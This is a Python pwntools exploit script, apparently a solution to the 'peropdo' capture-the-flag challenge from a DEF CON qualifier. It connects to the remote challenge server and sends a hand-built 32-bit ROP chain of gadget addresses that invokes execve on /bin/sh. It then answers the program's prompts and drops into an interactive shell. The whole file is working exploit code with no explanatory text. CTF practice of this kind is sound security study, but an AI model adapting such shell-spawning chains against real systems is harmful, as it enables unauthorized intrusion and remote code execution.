from pwn import * 

#s = process("./peropdo")
s = remote("peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me", 80)

p = ''

'''
p += p32(0x0806f2fa) # pop edx ; ret
p += p32(0x080eb060) # @ .data
p += p32(0x080bc1e6) # pop eax ; ret
p += '/bin'
p += p32(0x08097ef6) # mov dword ptr [edx], eax ; pop ebx ; ret
p += p32(0x41414141) # padding
p += p32(0x0806f2fa) # pop edx ; ret
p += p32(0x080eb064) # @ .data + 4
p += p32(0x080bc1e6) # pop eax ; ret
p += '//sh'
p += p32(0x08097ef6) # mov dword ptr [edx], eax ; pop ebx ; ret
p += p32(0x41414141) # padding
p += p32(0x0806f2fa) # pop edx ; ret
p += p32(0x080eb068) # @ .data + 8
p += p32(0x08054b80) # xor eax, eax ; ret
p += p32(0x08097ef6) # mov dword ptr [edx], eax ; pop ebx ; ret
p += p32(0x41414141) # padding
'''

seed = 0x189a580
p += p32(seed)

p += p32(0x080481c9) # pop ebx ; ret
p += p32(0x80ed014) # @ .data
p += p32(0x080e5ee1) # pop ecx ; ret
p += p32(0x80ed01c) # @ .data + 8
p += p32(0x0806f2fa) # pop edx ; ret
p += p32(0x80ed01c) # @ .data + 8
p += p32(0x08054b80) # xor eax, eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x0807bf06) # inc eax ; ret
p += p32(0x08049551) # int 0x80

p += "A"*4

p += "/bin/sh\x00"
p += p32(0x80ed014)
p += "\x00"*4

s.sendline(p)

s.recvuntil("do, ")

buf = s.recvline()

print repr(buf)

s.sendline("24")
s.sendline("y")

s.sendline("24")
s.sendline("n")

s.interactive()

